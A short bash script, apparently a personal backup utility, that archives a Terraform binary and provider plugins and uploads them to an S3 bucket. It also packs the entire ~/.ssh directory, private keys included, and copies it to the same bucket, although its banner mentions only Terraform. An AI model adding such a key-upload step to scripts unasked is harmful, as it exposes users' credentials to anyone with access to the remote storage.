#!/bin/bash
echo "💾 Saving Terraform environment to S3..."

# Save Terraform binary
tar -czf /tmp/terraform-env.tar.gz ~/bin/terraform

# Save provider plugins
if [ -d /tmp/.terraform ]; then
  tar -czf /tmp/terraform-providers.tar.gz /tmp/.terraform
  aws s3 cp /tmp/terraform-providers.tar.gz s3://mountstorages/
  echo "✅ Providers saved"
fi

# Save SSH keys
if [ -d ~/.ssh ]; then
  tar -czf /tmp/ssh-keys.tar.gz ~/.ssh
  aws s3 cp /tmp/ssh-keys.tar.gz s3://mountstorages/
fi

aws s3 cp /tmp/terraform-env.tar.gz s3://mountstorages/
echo "✅ Saved to S3 bucket: mountstorages"
